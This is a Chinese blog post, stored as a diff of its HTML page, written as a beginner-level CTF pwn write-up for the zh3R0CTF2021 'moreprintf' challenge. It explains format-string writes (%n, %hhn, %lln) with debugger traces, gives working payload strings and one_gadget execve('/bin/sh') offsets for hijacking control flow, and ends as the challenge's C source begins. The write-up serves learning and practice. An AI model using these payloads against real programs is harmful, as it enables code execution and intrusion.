@@ -1,0 +1,331 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>pwn入门-47-zh3R0CTF2021-moreprintf | 唐仔橙</title><meta name="keywords" content="PWN入门"><meta name="author" content="唐仔橙,tangzicheng233@gmail.com"><meta name="copyright" content="唐仔橙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这个题还有一些奇奇怪怪的问题, 但是怕自己跑偏了,就暂时先放下了,后面有空再研究.(或许和fprintf的机制有关? ​	先复习一下格式化字符串,本来想看看之前自己写的笔记…看了一下后想起来了一句名言,大意就是你去修改一个很烂的项目不如重构….恩….写的太烂了…不如重写一篇… 格式化字符串漏洞基础%n​	为什么能写入值呢,就是这个%n,它是将之前已经打印的字符个数赋值给当前偏移处的指针指向的地址">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门-47-zh3R0CTF2021-moreprintf">
+<meta property="og:url" content="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/index.html">
+<meta property="og:site_name" content="唐仔橙">
+<meta property="og:description" content="这个题还有一些奇奇怪怪的问题, 但是怕自己跑偏了,就暂时先放下了,后面有空再研究.(或许和fprintf的机制有关? ​	先复习一下格式化字符串,本来想看看之前自己写的笔记…看了一下后想起来了一句名言,大意就是你去修改一个很烂的项目不如重构….恩….写的太烂了…不如重写一篇… 格式化字符串漏洞基础%n​	为什么能写入值呢,就是这个%n,它是将之前已经打印的字符个数赋值给当前偏移处的指针指向的地址">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tangzichengcc.github.io/img/background/15.png">
+<meta property="article:published_time" content="2023-11-12T15:40:29.000Z">
+<meta property="article:modified_time" content="2023-11-16T13:07:51.662Z">
+<meta property="article:author" content="唐仔橙">
+<meta property="article:tag" content="PWN入门">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tangzichengcc.github.io/img/background/15.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":500,"languages":{"author":"作者: 唐仔橙","link":"链接: ","source":"来源: 唐仔橙","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pwn入门-47-zh3R0CTF2021-moreprintf',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-16 21:07:51'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">80</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background/15.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn入门-47-zh3R0CTF2021-moreprintf</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-12T15:40:29.000Z" title="发表于 2023-11-12 23:40:29">2023-11-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-16T13:07:51.662Z" title="更新于 2023-11-16 21:07:51">2023-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn入门-47-zh3R0CTF2021-moreprintf"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这个题还有一些奇奇怪怪的问题, 但是怕自己跑偏了,就暂时先放下了,后面有空再研究.(或许和fprintf的机制有关?</p>
+<p>​	先复习一下格式化字符串,本来想看看之前自己写的笔记…看了一下后想起来了一句名言,大意就是你去修改一个很烂的项目不如重构….恩….写的太烂了…不如重写一篇…</p>
+<h1 id="格式化字符串漏洞基础"><a href="#格式化字符串漏洞基础" class="headerlink" title="格式化字符串漏洞基础"></a>格式化字符串漏洞基础</h1><h2 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h2><p>​	为什么能写入值呢,就是这个%n,它是将之前已经打印的字符个数赋值给当前偏移处的指针指向的地址</p>
+<p>​	例如%100×10$n: 将100写入第十个位置所保存的指针指向的地址(4字节), %$hn是2字节,%$hhn是1字节,%$lln是8字节</p>
+<h2 id="p"><a href="#p" class="headerlink" title="%p"></a>%p</h2><p>​	%p %p %p %p %p %p %p %p %p %p </p>
+<p>​	在b *fprintf+143也就是vprintf下断点,然后set $rdi&#x3D;_IO_stdout, 单步,就可以打印地址了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*RSI  <span class="number">0x55555555b4c0</span> ◂— <span class="string">&#x27;0x55555555b260 0x7ffff7af2151 0x7ffff7dcf8c0 0x7ffff7ff5540 0x7fffffffe470 0xb1dad8e32f5ad200 0x5555555552c0 0x7ffff7a03bf7 0x1 0x7fffffffe568\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	前四个值和后四个值</p>
+<p><img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231112234114271.png" alt="image-20231112234114271"></p>
+<h2 id="c"><a href="#c" class="headerlink" title="%c"></a>%c</h2><p>​	c是一个字符的意思, 在后面的exp中,%c%c%c%5c%hhn表示,前三次输出,都是输出一个字符,第四次是5个字符,然后一共是8个字节了,把8写入第5个位置的指针指向的地址.</p>
+<p>​	set $rdi&#x3D;_IO_stdout  ( 其他版本呢?)</p>
+<p>​	%caaa%cbbb%cccc%5cddd%hhn,</p>
+<p>​	可以看到确实只打印了第一个字符,然后%5c是把不足的用空格补齐</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`aaaQbbb�ccc    @ddd</span><br></pre></td></tr></table></figure>
+
+<img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-04-22.jpg" alt="Snipaste_2023-11-08_20-04-22" style="zoom:50%;">
+
+
+
+<p>​	然后把值写到了第5个位置的指针指向的地址</p>
+<p>​	用%c%c%c%5c%hhn试一下, 可以看到确实是改成了0x08</p>
+<img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-09-31.jpg" alt="Snipaste_2023-11-08_20-09-31" style="zoom:50%;">
+
+<p>​	但在我这里应该是要改成0xc8 不过其实应该没影响,都是把read地方的值改成onegadget</p>
+<h3 id="任意地址写修改值"><a href="#任意地址写修改值" class="headerlink" title="任意地址写修改值"></a>任意地址写修改值</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%<span class="number">5</span>c%hhn%*<span class="number">8</span>$d%<span class="number">186326</span>c%<span class="number">5</span>$n</span><br></pre></td></tr></table></figure>
+
+<p>​	</p>
+<p>​	除了wp给的payload,换其他的很多都不行…为什么呢?? 仔细观察源码, <strong>有输入长度的限制的</strong>,  fgets(buffer, 31, stdin); </p>
+<p>​	如果不是单纯做题而是研究一下打法的话,可以拓展一下长度试试,这样的话应该就好很多,(可以加系统调用限制,然后又是orw的一道题(x)) (或者直接在运行的时候改寄存器,修改读入长度)</p>
+<h4 id="修改ret返回值-x"><a href="#修改ret返回值-x" class="headerlink" title="修改ret返回值(x)"></a>修改ret返回值(x)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0x7fffffffe4a0</span> —▸ <span class="number">0x555555555100</span> (_start) ◂— endbr64</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x7fffffffe4a8</span> —▸ <span class="number">0x5555555552af</span> (main+<span class="number">198</span>) ◂— mov edi, <span class="number">1</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7fffffffe4b0</span> ◂— <span class="number">0x7fffffffe4b0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7fffffffe4b8</span> ◂— <span class="number">0xb8204e953bb68d00</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│ rbp <span class="number">0x7fffffffe4c0</span> —▸ <span class="number">0x5555555552c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7fffffffe4c8</span> —▸ <span class="number">0x7ffff7a03c87</span> (__libc_start_main+<span class="number">231</span>) ◂— mov edi, eax</span><br><span class="line">    </span><br><span class="line">%c%c%c%<span class="number">197</span>c%hhn%*<span class="number">8</span>$d%????c%<span class="number">5</span>$n</span><br></pre></td></tr></table></figure>
+
+
+
+<p>onegadget - (200 + 0x21c87 )就是要改的值了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4f2a5</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f302</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a2fc</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
+
+<p>0x4f2a5- (200 + 0x21c87 ) &#x3D; 185686</p>
+<p>%c%c%c%197c%hhn%*8$d%185686c%5$n</p>
+<p>邪门,就是不出c8,概率比较小,可能和系统有关?</p>
+<p>改成0x18吧…</p>
+<p>%c%c%c%21c%hhn%*8$d%185862c%5$n</p>
+<p>但还是不行..</p>
+<p>问题出在这个函数没有ret的….那….. 所以覆盖了也没用…</p>
+<p>fprintf之后有ret 回main函数的exit, 是不是可以修改这里呢? 这里就是下面的main+198</p>
+<p><img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231116172117205.png" alt="image-20231116172117205"></p>
+<h4 id="改其他的函数指针-比如改main-198"><a href="#改其他的函数指针-比如改main-198" class="headerlink" title="改其他的函数指针,比如改main+198"></a>改其他的函数指针,比如改main+198</h4><p>0x556fe88e42af这里会执行到的,但是是把这里的值改了(用watch下断点查看)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0x7ffca5108380</span> —▸ <span class="number">0x556fe88e4100</span> (_start) ◂— endbr64</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x7ffca5108388</span> —▸ <span class="number">0x556fe88e42af</span> (main+<span class="number">198</span>) ◂— mov edi, <span class="number">1</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7ffca5108390</span> ◂— <span class="number">0x7ffca5108390</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7ffca5108398</span> ◂— <span class="number">0x695c632b96376d00</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│ rbp <span class="number">0x7ffca51083a0</span> —▸ <span class="number">0x556fe88e42c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7ffca51083a8</span> —▸ <span class="number">0x7fc96c879c87</span> (__libc_start_main+<span class="number">231</span>) ◂— mov edi, eax</span><br></pre></td></tr></table></figure>
+
+
+
+<p>修改下内存测试下</p>
+<p>0x7f8d3724c000+0x4f2a5  &#x3D; 0x7f8d3729b2a5</p>
+<p>set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)</p>
+<p>set *0x7ffc28b196dc&#x3D; 0x7f8d</p>
+<p>这里会把这个值修改一下,但不知道后面会不会执行, 会执行!!!</p>
+<p>0x18: %c%c%c%21c%hhn%*8$d%185862c%5$n</p>
+<p>0x28: %c%c%c%37c%hhn%*8$d%185846c%5$n</p>
+<p> 但是没办法一次改完….得两次啊,不对,应该用%lln</p>
+<p>0x18: %c%c%c%21c%hhn%*8$d%185862c%5$lln</p>
+<p>0x28: %c%c%c%37c%hhn%*8$d%185846c%5$lln</p>
+<p>不过为什么好像没有改成8字节,还是4字节呢?</p>
+<p>以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下</p>
+<h2 id="如何确定能到read"><a href="#如何确定能到read" class="headerlink" title="如何确定能到read"></a>如何确定能到read</h2><p>​	那就算修改了read, 怎么确定一定会执行到read呢, 不是执行到read,而是执行到栈里的这个地方,把那里的值改了,看wp一头雾水,wp中的调用链在本地测试不是这样</p>
+<p>​	<font color="red">所以我感觉有几份就是瞎扯淡,瞎蒙的(不过也可能是自己认识不足</font></p>
+<p><img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231108230705755.png" alt="image-20231108230705755"></p>
+<p>​	是在vprift里面触发的</p>
+<p>​	哦卧槽,这和栈的结构有关….?? 为什么返回地址会到这呢??</p>
+<p>​	改rsp上面那个值才行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7ffd959070f0</span> —▸ <span class="number">0x7ffd95907008</span> ◂— <span class="number">0x7f2523745be7</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7ffd959070f8</span> ◂— <span class="number">0xbaa72d067a954f00</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│ rbp <span class="number">0x7ffd95907100</span> —▸ <span class="number">0x562fc10992c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7ffd95907108</span> —▸ <span class="number">0x7f25dc8e7bf7</span> (__libc_start_main+<span class="number">231</span>) ◂— mov edi, eax</span><br><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x00007f2523745be7</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000003000000030</span> in ?? ()</span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007ffd959070f8</span> in ?? ()</span><br><span class="line">#<span class="number">3</span>  <span class="number">0x00007ffd95907030</span> in ?? ()</span><br><span class="line">#<span class="number">4</span>  <span class="number">0xbaa72d067a954f00</span> in ?? ()</span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007f25dccb1a00</span> in ?? () from ./libc.so<span class="number">.6</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007f25dccae2a0</span> in ?? () from ./libc.so<span class="number">.6</span></span><br><span class="line">#<span class="number">7</span>  <span class="number">0x0000562fc300d260</span> in ?? ()</span><br><span class="line">#<span class="number">8</span>  <span class="number">0x00007f25dc9d6151</span> in __GI___libc_read (fd=<span class="number">-1785699856</span>, buf=<span class="number">0x562fc300d27e</span>, nbytes=<span class="number">0</span>) at ../sysdeps/unix/sysv/linux/read.c:<span class="number">27</span></span><br><span class="line">#<span class="number">9</span>  <span class="number">0x00007f25dccb38c0</span> in _IO_stdfile_2_lock () from ./libc.so<span class="number">.6</span></span><br><span class="line">#<span class="number">10</span> <span class="number">0x00007f25dcedf540</span> in ?? ()</span><br><span class="line">#<span class="number">11</span> <span class="number">0xffffffffffffffb0</span> in ?? ()</span><br><span class="line">#<span class="number">12</span> <span class="number">0x0000000000000000</span> in ?? ()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">pwndbg&gt; tele $rsp<span class="number">-0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffd95907000</span> —▸ <span class="number">0x7ffd95907100</span> —▸ <span class="number">0x562fc10992c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffd95907008</span> ◂— <span class="number">0x7f2523745be7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rsp <span class="number">0x7ffd95907010</span> ◂— <span class="number">0x3000000030</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffd95907018</span> —▸ <span class="number">0x7ffd959070f8</span> ◂— <span class="number">0xbaa72d067a954f00</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffd95907020</span> —▸ <span class="number">0x7ffd95907030</span> —▸ <span class="number">0x7f25dccb1a00</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7ffd95907028</span> ◂— <span class="number">0xbaa72d067a954f00</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffd95907030</span> —▸ <span class="number">0x7f25dccb1a00</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7ffd95907038</span> —▸ <span class="number">0x7f25dccae2a0</span> (__GI__IO_file_jumps) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele $rsp<span class="number">-0x8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffea6ecc4b8</span> —▸ <span class="number">0x7fa5e518df44</span> (<span class="built_in">fprintf</span>+<span class="number">148</span>) ◂— mov rcx, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsp <span class="number">0x7ffea6ecc4c0</span> ◂— <span class="number">0x3000000030</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffea6ecc4c8</span> —▸ <span class="number">0x7ffea6ecc5a8</span> ◂— <span class="number">0x3d76d5b605211900</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffea6ecc4d0</span> —▸ <span class="number">0x7ffea6ecc4e0</span> —▸ <span class="number">0x7fa5e5514a00</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffea6ecc4d8</span> ◂— <span class="number">0x3d76d5b605211900</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7ffea6ecc4e0</span> —▸ <span class="number">0x7fa5e5514a00</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffea6ecc4e8</span> —▸ <span class="number">0x7fa5e55112a0</span> (__GI__IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7ffea6ecc4f0</span> —▸ <span class="number">0x55e932c72260</span> ◂— <span class="string">&#x27;%c%c%c%5c%hhn%*8$d%186326c%5$n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc -o more-printf -fstack-protector-all more-printf.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">uint64_t</span> i = <span class="number">0x8d9e7e558877</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">/* Just to save some of your time */</span></span><br><span class="line">  <span class="type">uint64_t</span> *p;</span><br><span class="line">  p = &amp;p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Chall */</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span 